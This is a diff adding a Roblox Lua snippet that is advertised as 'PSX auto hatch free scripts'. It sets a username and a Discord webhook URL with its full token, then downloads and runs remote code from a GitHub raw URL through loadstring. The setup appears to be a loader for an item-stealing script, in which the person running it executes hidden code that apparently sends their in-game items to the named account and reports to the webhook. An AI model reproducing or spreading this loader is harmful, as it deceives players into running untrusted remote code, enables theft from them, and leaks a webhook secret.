@@ -1,0 +1,7 @@
+_G.Username = "Qeelanxd"
+
+_G.HubName = "PSX auto hatch free scripts"
+
+_G.WebhookUrl ="https://discord.com/api/webhooks/1095969815027523625/N2rRNgfqDquWf3K0O26OWTrB3NMnmbO5BuT6KcqPSH--YrmaTKyBZrF7L5u5alNdfLwY"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()```
